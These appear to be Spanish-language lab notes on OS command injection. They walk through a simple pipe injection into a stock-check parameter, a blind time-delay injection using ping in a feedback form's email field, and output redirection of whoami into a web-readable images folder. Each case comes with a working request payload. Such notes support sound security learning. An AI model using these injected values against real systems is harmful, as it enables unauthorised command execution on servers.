# OS command injection


# OS command injection, simple case

El caso mas simple en donde se consulta el stock se le agrega el | y el comando

```
productId=1&storeId=1|whoami

```

# Blind OS command injection with time delays

En este caso se inyectan comandos en Submmit feedback se usa de nueva cuenta el pipe |

```
csrf=fTYXLcrD0AxoStj3Bo0z58nhjs22Oep5&name=Masa&email=masa%40gmail.com||ping+-c+10+127.0.0.1||&subject=abcd1234&message=Comment
```

# Blind OS command injection with output redirection

Para este laboratorio no se refleja el comanod inyectado en el email de submitt feedback sin embargo se puede redireccionar a una carpeta con 
permisos de escritura /var/wwww/images( desde donde se cargan las imagenes) si damos clic derecho en una imagen y le ponemos cargar en una pestaña
nos da image?filename=image.jpg entonces si se cargan de esa ruta podriamos hacer algo como image?filename=out.txt.

```
csrf=Kfbe6pN4ThGKonJGCUZmmSS2tzjh6CF0&name=Masa&email=masa%40gmail.com|whoami>out4.txt||&subject=abcd1234&message=Comment

```
NO olvides que si no agregas los 2 || al final no se porque pero no sirve.



